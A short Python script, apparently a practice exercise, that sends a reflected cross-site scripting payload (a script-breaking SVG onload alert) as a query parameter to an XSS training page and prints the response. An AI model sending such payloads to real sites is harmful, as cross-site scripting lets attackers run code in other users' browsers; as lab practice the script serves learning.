#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

payload = '"</script><svg onload=alert(1+1)>'

params = {'p12': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
